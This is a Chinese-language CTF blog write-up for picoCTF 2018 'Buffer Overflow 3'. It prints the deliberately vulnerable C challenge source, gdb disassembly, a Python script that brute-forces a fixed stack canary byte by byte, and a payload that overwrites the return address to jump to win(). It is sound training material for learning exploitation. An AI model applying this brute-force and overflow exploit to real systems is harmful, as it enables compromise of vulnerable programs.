<!DOCTYPE html>
<html lang="zh-Hans">

<head>
    <meta charset="utf-8"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Buffer Overflow 3 | dontpan1c 的 CTF 笔记</title>
<meta name="generator" content="Jekyll v3.8.5" />
<meta property="og:title" content="Buffer Overflow 3" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="这道题模拟了栈溢出保护，但 canary 是固定的：" />
<meta property="og:description" content="这道题模拟了栈溢出保护，但 canary 是固定的：" />
<link rel="canonical" href="https://ctf.dontpanic.blog/writeups/picoctf-2018-buffer-overflow-3.html" />
<meta property="og:url" content="https://ctf.dontpanic.blog/writeups/picoctf-2018-buffer-overflow-3.html" />
<meta property="og:site_name" content="dontpan1c 的 CTF 笔记" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-02-27T00:00:00+00:00" />
<script type="application/ld+json">
{"description":"这道题模拟了栈溢出保护，但 canary 是固定的：","@type":"BlogPosting","url":"https://ctf.dontpanic.blog/writeups/picoctf-2018-buffer-overflow-3.html","headline":"Buffer Overflow 3","dateModified":"2019-02-27T00:00:00+00:00","datePublished":"2019-02-27T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ctf.dontpanic.blog/writeups/picoctf-2018-buffer-overflow-3.html"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
    <link rel="stylesheet" href="/assets/css/fontawesome.min.css">
    <script src="/assets/js/index.js"></script>
</head>

<body>
    <div class="d-flex flex-grow-1 flex-column h-100">
        <nav class="navbar navbar-expand-lg navbar-light bg-light">
            <a class="navbar-brand" href="/">dontpan1c 的 CTF 笔记</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarColor03"
                aria-controls="navbarColor03" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarColor03">
                <ul class="navbar-nav mr-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="/">首页</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="https://dontpanic.blog" target="_blank">博客</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="https://dontpanic.blog/about" target="_blank">关于</a>
                    </li>
                </ul>
                <ul class="navbar-nav dp-navbar-right">
                    <li class="nav-item">
                        <a class="nav-link" href="https://github.com/dontpanic92/ctf-writeups" target="_blank">
                            <i class="fab fa-github"></i><span>&nbsp;仓库</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/feed.xml" target="_blank">
                            <i class="fas fa-rss"></i><span>&nbsp;订阅</span>
                        </a>
                    </li>
                </ul>
                <form class="form-inline my-2 my-lg-0" action="/search" method="GET">
                    <input name="query" class="form-control mr-sm-2" type="text" placeholder="搜索">
                    <button class="btn btn-secondary my-2 my-sm-0" type="submit">搜索</button>
                </form>
            </div>
        </nav>
        <div class="d-flex flex-grow-1 h-100 container pt-3 justify-content-center">
            <div class="col-3">
    <div class="list-group border-primary">
        <a class="list-group-item list-group-item-action active" href="/">
            <h6><strong>孤舟蓑笠翁</strong></h6>
            <span class="font-weight-light">独钓寒江雪。CTF 解题报告</span>
        </a>
        <a class="list-group-item list-group-item-action " href="/notes">
            <h6><strong>温故而知新</strong></h6>
            <span class="font-weight-light">可以为师矣。知识笔记</span>
        </a>
        <a class="list-group-item list-group-item-action " href="/cheatsheets">
            <h6><strong>愿君多采撷</strong></h6>
            <span class="font-weight-light">此物最相思。Cheatsheets</span>
        </a>
        <a class="list-group-item list-group-item-action " href="/tools">
            <h6><strong>工欲善其事</strong></h6>
            <span class="font-weight-light">必先利其器。实用工具索引</span>
        </a>
        <!--a class="list-group-item list-group-item-action">
            海内存知己
        </a-->
    </div>
    <div class="card mt-5">
        <div class="card-header">
            近期发布
        </div>
        <div class="list-group list-group-flush">
            
            <a class="list-group-item list-group-item-action" href="/writeups/reversing-kr-easy-keygenme.html">
                <h6><strong>Easy KeygenMe</strong></h6>
                <span class="font-weight-light"><p>题目要求 Find the Name when the Serial is 5B134977135E7D13：</p>
</span>
                <small>2019年03月12日 | writeups | reversing</small>
            </a>
            
            <a class="list-group-item list-group-item-action" href="/notes/stack-buffer-overflow-canary.html">
                <h6><strong>栈缓冲区溢出之三 Security Cookie / Canary</strong></h6>
                <span class="font-weight-light"><p>当栈溢出发生时，如果能够检测到栈溢出已经发生，就可以及时中止程序的执行，从而能够避免继续走攻击者安排好的路。Windows 上的 Security Cookie 就是这样一种机制。在 Linux 上，Canary 这个名字更常用。不论是 Security Cookie 还是 Canary，它们的原理都是相同的。</p>
</span>
                <small>2019年02月28日 | notes | binary</small>
            </a>
            
            <a class="list-group-item list-group-item-action" href="/writeups/picoctf-2018-buffer-overflow-3.html">
                <h6><strong>Buffer Overflow 3</strong></h6>
                <span class="font-weight-light"><p>这道题模拟了栈溢出保护，但 canary 是固定的：</p>
</span>
                <small>2019年02月27日 | writeups | pwn</small>
            </a>
            
            <a class="list-group-item list-group-item-action" href="/writeups/picoctf-2018-buffer-overflow-012.html">
                <h6><strong>Buffer Overflow 0 / 1 / 2</strong></h6>
                <span class="font-weight-light"><p>因为这几道题都比较简单，所以合并在一起了：</p>
</span>
                <small>2019年02月26日 | writeups | pwn</small>
            </a>
            
            <a class="list-group-item list-group-item-action" href="/writeups/picoctf-2013-rop-4.html">
                <h6><strong>ROP 4</strong></h6>
                <span class="font-weight-light"><p>这道题是 PicoCTF 2013 ROP 系列的最后一题：</p>
</span>
                <small>2019年02月26日 | writeups | pwn</small>
            </a>
            
        </div>
    </div>
</div>
<div id="content" class="col-8 pl-4">
    <h1>Buffer Overflow 3</h1>
<span class="d-block"><small>发布日期：2019年02月27日</small></span>
<span class="d-block"><small>类别：pwn</small></span>

<span class="d-block">
    <small>题目来源：picoctf-2018</small>
</span>


<span class="d-block">
    <small>题目链接：<a href="https://2018game.picoctf.com/" target="_blank">https://2018game.picoctf.com/</a>

        (需要注册登录)

    </small>
</span>


<hr />
<p>这道题模拟了栈溢出保护，但 canary 是固定的：</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb1-1" title="1"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></a>
<a class="sourceLine" id="cb1-2" title="2"><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></a>
<a class="sourceLine" id="cb1-3" title="3"><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></a>
<a class="sourceLine" id="cb1-4" title="4"><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></a>
<a class="sourceLine" id="cb1-5" title="5"><span class="pp">#include </span><span class="im">&lt;sys/types.h&gt;</span></a>
<a class="sourceLine" id="cb1-6" title="6"><span class="pp">#include </span><span class="im">&lt;wchar.h&gt;</span></a>
<a class="sourceLine" id="cb1-7" title="7"><span class="pp">#include </span><span class="im">&lt;locale.h&gt;</span></a>
<a class="sourceLine" id="cb1-8" title="8"></a>
<a class="sourceLine" id="cb1-9" title="9"><span class="pp">#define BUFSIZE 32</span></a>
<a class="sourceLine" id="cb1-10" title="10"><span class="pp">#define FLAGSIZE 64</span></a>
<a class="sourceLine" id="cb1-11" title="11"><span class="pp">#define CANARY_SIZE 4</span></a>
<a class="sourceLine" id="cb1-12" title="12"></a>
<a class="sourceLine" id="cb1-13" title="13"><span class="dt">void</span> win() {</a>
<a class="sourceLine" id="cb1-14" title="14">  <span class="dt">char</span> buf[FLAGSIZE];</a>
<a class="sourceLine" id="cb1-15" title="15">  <span class="dt">FILE</span> *f = fopen(<span class="st">&quot;flag.txt&quot;</span>,<span class="st">&quot;r&quot;</span>);</a>
<a class="sourceLine" id="cb1-16" title="16">  <span class="cf">if</span> (f == NULL) {</a>
<a class="sourceLine" id="cb1-17" title="17">    printf(<span class="st">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb1-18" title="18">    exit(<span class="dv">0</span>);</a>
<a class="sourceLine" id="cb1-19" title="19">  }</a>
<a class="sourceLine" id="cb1-20" title="20"></a>
<a class="sourceLine" id="cb1-21" title="21">  fgets(buf,FLAGSIZE,f);</a>
<a class="sourceLine" id="cb1-22" title="22">  puts(buf);</a>
<a class="sourceLine" id="cb1-23" title="23">  fflush(stdout);</a>
<a class="sourceLine" id="cb1-24" title="24">}</a>
<a class="sourceLine" id="cb1-25" title="25"></a>
<a class="sourceLine" id="cb1-26" title="26"><span class="dt">char</span> global_canary[CANARY_SIZE];</a>
<a class="sourceLine" id="cb1-27" title="27"><span class="dt">void</span> read_canary() {</a>
<a class="sourceLine" id="cb1-28" title="28">  <span class="dt">FILE</span> *f = fopen(<span class="st">&quot;canary.txt&quot;</span>,<span class="st">&quot;r&quot;</span>);</a>
<a class="sourceLine" id="cb1-29" title="29">  <span class="cf">if</span> (f == NULL) {</a>
<a class="sourceLine" id="cb1-30" title="30">    printf(<span class="st">&quot;Canary is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb1-31" title="31">    exit(<span class="dv">0</span>);</a>
<a class="sourceLine" id="cb1-32" title="32">  }</a>
<a class="sourceLine" id="cb1-33" title="33"></a>
<a class="sourceLine" id="cb1-34" title="34">  fread(global_canary,<span class="kw">sizeof</span>(<span class="dt">char</span>),CANARY_SIZE,f);</a>
<a class="sourceLine" id="cb1-35" title="35">  fclose(f);</a>
<a class="sourceLine" id="cb1-36" title="36">}</a>
<a class="sourceLine" id="cb1-37" title="37"></a>
<a class="sourceLine" id="cb1-38" title="38"><span class="dt">void</span> vuln(){</a>
<a class="sourceLine" id="cb1-39" title="39">   <span class="dt">char</span> canary[CANARY_SIZE];</a>
<a class="sourceLine" id="cb1-40" title="40">   <span class="dt">char</span> buf[BUFSIZE];</a>
<a class="sourceLine" id="cb1-41" title="41">   <span class="dt">char</span> length[BUFSIZE];</a>
<a class="sourceLine" id="cb1-42" title="42">   <span class="dt">int</span> count;</a>
<a class="sourceLine" id="cb1-43" title="43">   <span class="dt">int</span> x = <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb1-44" title="44">   memcpy(canary,global_canary,CANARY_SIZE);</a>
<a class="sourceLine" id="cb1-45" title="45">   printf(<span class="st">&quot;How Many Bytes will You Write Into the Buffer?</span><span class="sc">\n</span><span class="st">&gt; &quot;</span>);</a>
<a class="sourceLine" id="cb1-46" title="46">   <span class="cf">while</span> (x&lt;BUFSIZE) {</a>
<a class="sourceLine" id="cb1-47" title="47">      read(<span class="dv">0</span>,length+x,<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb1-48" title="48">      <span class="cf">if</span> (length[x]==<span class="ch">&#39;\n&#39;</span>) <span class="cf">break</span>;</a>
<a class="sourceLine" id="cb1-49" title="49">      x++;</a>
<a class="sourceLine" id="cb1-50" title="50">   }</a>
<a class="sourceLine" id="cb1-51" title="51">   sscanf(length,<span class="st">&quot;%d&quot;</span>,&amp;count);</a>
<a class="sourceLine" id="cb1-52" title="52"></a>
<a class="sourceLine" id="cb1-53" title="53">   printf(<span class="st">&quot;Input&gt; &quot;</span>);</a>
<a class="sourceLine" id="cb1-54" title="54">   read(<span class="dv">0</span>,buf,count);</a>
<a class="sourceLine" id="cb1-55" title="55"></a>
<a class="sourceLine" id="cb1-56" title="56">   <span class="cf">if</span> (memcmp(canary,global_canary,CANARY_SIZE)) {</a>
<a class="sourceLine" id="cb1-57" title="57">      printf(<span class="st">&quot;*** Stack Smashing Detected *** : Canary Value Corrupt!</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb1-58" title="58">      exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb1-59" title="59">   }</a>
<a class="sourceLine" id="cb1-60" title="60">   printf(<span class="st">&quot;Ok... Now Where&#39;s the Flag?</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb1-61" title="61">   fflush(stdout);</a>
<a class="sourceLine" id="cb1-62" title="62">}</a>
<a class="sourceLine" id="cb1-63" title="63"></a>
<a class="sourceLine" id="cb1-64" title="64"><span class="dt">int</span> main(<span class="dt">int</span> argc, <span class="dt">char</span> **argv){</a>
<a class="sourceLine" id="cb1-65" title="65"></a>
<a class="sourceLine" id="cb1-66" title="66">  setvbuf(stdout, NULL, _IONBF, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb1-67" title="67">  </a>
<a class="sourceLine" id="cb1-68" title="68">  <span class="co">// Set the gid to the effective gid</span></a>
<a class="sourceLine" id="cb1-69" title="69">  <span class="co">// this prevents /bin/sh from dropping the privileges</span></a>
<a class="sourceLine" id="cb1-70" title="70">  <span class="dt">int</span> i;</a>
<a class="sourceLine" id="cb1-71" title="71">  gid_t gid = getegid();</a>
<a class="sourceLine" id="cb1-72" title="72">  setresgid(gid, gid, gid);</a>
<a class="sourceLine" id="cb1-73" title="73">  read_canary();</a>
<a class="sourceLine" id="cb1-74" title="74">  vuln();</a>
<a class="sourceLine" id="cb1-75" title="75">  <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb1-76" title="76">}</a></code></pre></div>
<div>
<div id="writeup_show_button" style="cursor: pointer">
    <div class="alert alert-warning">
        <b><i class="fas fa-exclamation-circle"></i> 点击此处显示 Writeup</b>
    </div>
</div>
<div id="writeup_hide_button" style="cursor: pointer" class="d-none">
    <div class="alert alert-info">
        <b><i class="fas fa-exclamation-circle"></i> 点击此处隐藏 Writeup</b>
    </div>
</div>
<script>
(function()
{
    var parent = document.scripts[document.scripts.length - 1].parentNode;
    parent.querySelector("#writeup_show_button").onclick = function ()
    {
        parent.querySelector("#writeup_hide_button").classList.remove("d-none");
        parent.querySelector("#writeup_show_button").classList.add("d-none");
        parent.querySelector("#writeup").classList.remove("d-none");
    }
    parent.querySelector("#writeup_hide_button").onclick = function ()
    {
        parent.querySelector("#writeup_hide_button").classList.add("d-none");
        parent.querySelector("#writeup_show_button").classList.remove("d-none");
        parent.querySelector("#writeup").classList.add("d-none");
    }
})();
</script>
<div id="writeup" class="d-none" markdown="1">
<p>由于 Canary 是固定的，因此可以通过多次运行猜测出 Canary 的值。首先我们看一下各个局部变量的位置：</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode asm"><code class="sourceCode fasm"><a class="sourceLine" id="cb2-1" title="1">(gdb) disas vuln</a>
<a class="sourceLine" id="cb2-2" title="2">Dump of assembler code for function vuln:</a>
<a class="sourceLine" id="cb2-3" title="3"><span class="bn">   0x080487c3 </span>&lt;+<span class="dv">0</span>&gt;:     <span class="bu">push</span>   %<span class="kw">ebp</span></a>
<a class="sourceLine" id="cb2-4" title="4"><span class="bn">   0x080487c4 </span>&lt;+<span class="dv">1</span>&gt;:     <span class="bu">mov</span>    %<span class="kw">esp</span>,%<span class="kw">ebp</span></a>
<a class="sourceLine" id="cb2-5" title="5"><span class="bn">   0x080487c6 </span>&lt;+<span class="dv">3</span>&gt;:     <span class="bu">sub</span>    <span class="dv">$</span><span class="bn">0x58,</span>%<span class="kw">esp</span></a>
<a class="sourceLine" id="cb2-6" title="6"><span class="bn">   0x080487c9 </span>&lt;+<span class="dv">6</span>&gt;:     movl   <span class="dv">$</span><span class="bn">0x0,</span>-<span class="bn">0xc</span>(%<span class="kw">ebp</span>)</a>
<a class="sourceLine" id="cb2-7" title="7"><span class="bn">   0x080487d0 </span>&lt;+<span class="dv">13</span>&gt;:    <span class="bu">mov</span><span class="bn">    0x804a058,</span>%<span class="kw">eax</span></a>
<a class="sourceLine" id="cb2-8" title="8"><span class="bn">   0x080487d5 </span>&lt;+<span class="dv">18</span>&gt;:    <span class="bu">mov</span>    %<span class="kw">eax</span>,-<span class="bn">0x10</span>(%<span class="kw">ebp</span>) <span class="co">; canary = $ebp - 0x10</span></a>
<a class="sourceLine" id="cb2-9" title="9"><span class="bn">   0x080487d8 </span>&lt;+<span class="dv">21</span>&gt;:    <span class="bu">sub</span>    <span class="dv">$</span><span class="bn">0xc</span>,%<span class="kw">esp</span></a>
<a class="sourceLine" id="cb2-10" title="10"><span class="bn">   0x080487db </span>&lt;+<span class="dv">24</span>&gt;:    <span class="bu">push</span>   <span class="dv">$</span><span class="bn">0x8048a90</span></a>
<a class="sourceLine" id="cb2-11" title="11"><span class="bn">   0x080487e0 </span>&lt;+<span class="dv">29</span>&gt;:    <span class="bu">call</span><span class="bn">   0x8048500 </span>&lt;printf@plt&gt;</a>
<a class="sourceLine" id="cb2-12" title="12"><span class="bn">   0x080487e5 </span>&lt;+<span class="dv">34</span>&gt;:    <span class="bu">add</span>    <span class="dv">$</span><span class="bn">0x10,</span>%<span class="kw">esp</span></a>
<a class="sourceLine" id="cb2-13" title="13"><span class="bn">   0x080487e8 </span>&lt;+<span class="dv">37</span>&gt;:    <span class="bu">jmp</span><span class="bn">    0x8048815 </span>&lt;vuln+<span class="dv">82</span>&gt;</a>
<a class="sourceLine" id="cb2-14" title="14"><span class="bn">   0x080487ea </span>&lt;+<span class="dv">39</span>&gt;:    <span class="bu">mov</span>    <span class="bn">-0xc</span>(%<span class="kw">ebp</span>),%<span class="kw">eax</span>  <span class="co">; x = $ebp-0xc</span></a>
<a class="sourceLine" id="cb2-15" title="15"><span class="bn">   0x080487ed </span>&lt;+<span class="dv">42</span>&gt;:    <span class="bu">lea</span>    <span class="bn">-0x50</span>(%<span class="kw">ebp</span>),%<span class="kw">edx</span> <span class="co">; length = $ebp - 0x50</span></a>
<a class="sourceLine" id="cb2-16" title="16">                        ...</a>
<a class="sourceLine" id="cb2-17" title="17"><span class="bn">   0x0804884c </span>&lt;+<span class="dv">137</span>&gt;:   <span class="bu">push</span>   %<span class="kw">eax</span></a>
<a class="sourceLine" id="cb2-18" title="18"><span class="bn">   0x0804884d </span>&lt;+<span class="dv">138</span>&gt;:   <span class="bu">lea</span>    <span class="bn">-0x30</span>(%<span class="kw">ebp</span>),%<span class="kw">eax</span> <span class="co">; buf = $ebp - 0x30</span></a>
<a class="sourceLine" id="cb2-19" title="19"><span class="bn">   0x08048850 </span>&lt;+<span class="dv">141</span>&gt;:   <span class="bu">push</span>   %<span class="kw">eax</span></a>
<a class="sourceLine" id="cb2-20" title="20"><span class="bn">   0x08048851 </span>&lt;+<span class="dv">142</span>&gt;:   <span class="bu">push</span>   <span class="dv">$</span><span class="bn">0x0</span></a>
<a class="sourceLine" id="cb2-21" title="21"><span class="bn">   0x08048853 </span>&lt;+<span class="dv">144</span>&gt;:   <span class="bu">call</span><span class="bn">   0x80484f0 </span>&lt;read@plt&gt;</a>
<a class="sourceLine" id="cb2-22" title="22"><span class="bn">   0x08048858 </span>&lt;+<span class="dv">149</span>&gt;:   <span class="bu">add</span>    <span class="dv">$</span><span class="bn">0x10,</span>%<span class="kw">esp</span></a>
<a class="sourceLine" id="cb2-23" title="23">                        ...</a>
<a class="sourceLine" id="cb2-24" title="24"><span class="bn">   0x080488b1 </span>&lt;+<span class="dv">238</span>&gt;:   <span class="bu">leave</span></a>
<a class="sourceLine" id="cb2-25" title="25"><span class="bn">   0x080488b2 </span>&lt;+<span class="dv">239</span>&gt;:   <span class="bu">ret</span></a></code></pre></div>
<p><code>canary</code> 在 <code>$ebp - 0x10</code>，<code>buf</code> 在 <code>$ebp - 0x30</code>，因此中间有 <code>0x20 = 32</code> 个字节。我们可以不断地执行这段程序，每次都覆盖 33 个字节，通过改变最后一个字节就可以根据程序输出暴力猜测出 <code>canary</code> 的第一个字节的值。然后以此类推，就可以猜出第 2、3、4 个字节。</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb3-1" title="1"><span class="im">import</span> subprocess <span class="im">as</span> sp</a>
<a class="sourceLine" id="cb3-2" title="2">flag <span class="op">=</span> <span class="va">True</span></a>
<a class="sourceLine" id="cb3-3" title="3">canary <span class="op">=</span> []</a>
<a class="sourceLine" id="cb3-4" title="4"><span class="cf">for</span> canary_index <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">4</span>):</a>
<a class="sourceLine" id="cb3-5" title="5">    i <span class="op">=</span> <span class="dv">0</span></a>
<a class="sourceLine" id="cb3-6" title="6">    <span class="cf">while</span> flag:</a>
<a class="sourceLine" id="cb3-7" title="7">        p <span class="op">=</span> sp.Popen(<span class="st">&quot;/problems/buffer-overflow-3_3/vuln&quot;</span>, stdin<span class="op">=</span>sp.PIPE, std</a>
<a class="sourceLine" id="cb3-8" title="8">out<span class="op">=</span>sp.PIPE, stderr<span class="op">=</span>sp.PIPE, bufsize<span class="op">=</span><span class="dv">1</span>, cwd<span class="op">=</span><span class="st">&quot;/problems/buffer-overflow-3_3&quot;</span>)</a>
<a class="sourceLine" id="cb3-9" title="9">        p.stdin.write(<span class="bu">str</span>(<span class="dv">33</span><span class="op">+</span>canary_index) <span class="op">+</span> <span class="st">&quot;</span><span class="ch">\n</span><span class="st">&quot;</span>)                                                            </a>
<a class="sourceLine" id="cb3-10" title="10">        p.stdin.write(<span class="st">&#39;0&#39;</span> <span class="op">*</span> <span class="dv">32</span> <span class="op">+</span> <span class="st">&#39;&#39;</span>.join(canary) <span class="op">+</span> <span class="bu">chr</span>(i) <span class="op">+</span> <span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)</a>
<a class="sourceLine" id="cb3-11" title="11">        o <span class="op">=</span> p.stdout.read()</a>
<a class="sourceLine" id="cb3-12" title="12">        <span class="cf">if</span> <span class="st">&quot;Stack Smashing Detected&quot;</span> <span class="kw">not</span> <span class="kw">in</span> o:</a>
<a class="sourceLine" id="cb3-13" title="13">            <span class="cf">break</span></a>
<a class="sourceLine" id="cb3-14" title="14">        i <span class="op">+=</span> <span class="dv">1</span></a>
<a class="sourceLine" id="cb3-15" title="15">        <span class="cf">if</span> i <span class="op">&gt;=</span> <span class="dv">256</span>:</a>
<a class="sourceLine" id="cb3-16" title="16">            <span class="bu">print</span> <span class="st">&quot;error finding canary&quot;</span></a>
<a class="sourceLine" id="cb3-17" title="17">            <span class="cf">break</span></a>
<a class="sourceLine" id="cb3-18" title="18"></a>
<a class="sourceLine" id="cb3-19" title="19">    <span class="bu">print</span> <span class="bu">hex</span>(i)</a>
<a class="sourceLine" id="cb3-20" title="20">    canary <span class="op">+=</span> [<span class="bu">chr</span>(i)]</a></code></pre></div>
<p>执行后就可以打印出 canary 的值：</p>
<pre><code>dontpanic@pico-2018-shell:/tmp/overflow3$ python bf.py
0x49
0x48
0x77
0x6a
dontpanic@pico-2018-shell:/tmp/overflow3$</code></pre>
<p>接下来就是常规的爆破了，看一下 <code>win</code> 的地址：</p>
<pre><code>(gdb) print win
$1 = {&lt;text variable, no debug info&gt;} 0x80486eb &lt;win&gt;</code></pre>
<p>然后：</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb6-1" title="1">python <span class="op">-</span>c <span class="st">&quot;print &#39;100</span><span class="ch">\n</span><span class="st">&#39; + &#39;0&#39; * 32 + &#39;</span><span class="ch">\x49\x48\x77\x6a</span><span class="st">XXXXXXXXXXXX&#39; + &#39;0000</span><span class="ch">\xeb\x86\x04\x08\n</span><span class="st">&#39;&quot;</span></a>
<a class="sourceLine" id="cb6-2" title="2">                                       ↑canary                          ↑ebp ↑返回地址</a></code></pre></div>
</div>
</div>


</div>

        </div>
        <div class="mt-5 p-5 bg-light text-muted">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-4">
                        <h5>dontpan1c 的 CTF 笔记</h5>
                        <span class="d-block font-weight-light">南阳一出即相，淮阴一出即将。</span>
                        <div class="btn-toolbar mt-4">
                            <div class="btn-group">
                              <a class="btn btn-secondary" href="https://github.com/dontpanic92"
                              target="_blank"><i class="fab fa-fw fa-github"></i></a>
                              <a class="btn btn-secondary" href="https://zhihu.com/people/li-sheng-qiu"
                              target="_blank"><i class="fab fa-fw fa-zhihu"></i></a>
                              <a class="btn btn-secondary" href="https://weibo.com/1184181045/profile"
                              target="_blank"><i class="fab fa-fw fa-weibo"></i></a>
                              <a class="btn btn-secondary" href="https://linkedin.com/in/lishengqiu"
                              target="_blank"><i class="fab fa-fw fa-linkedin-in"></i></a>
                              <a class="btn btn-secondary" href="https://stackoverflow.com/users/3196456"
                              target="_blank"><i class="fab fa-fw fa-stack-overflow"></i></a>
                              <a class="btn btn-secondary" href="http://renren.com/419200039"
                              target="_blank"><i class="fab fa-fw fa-renren"></i></a>
                            </div>
                        </div>
                    </div>
                    <div class="col-4">
                        <p><a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license"><img src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png"
                                    alt="知识共享许可协议"></a></p>
                        <p><small>本站所有作品均采用<a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license">知识共享署名-非商业性使用-相同方式共享
                                    4.0 国际许可协议</a>进行许可。</small></p>
                        <p><small>本站不包含明令禁止公开解题过程的题目。</small></p>
                        <span><small>本站由 <a href="https://jekyllrb.com/" target="_blank">Jekyll</a> 强力驱动。</small></span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>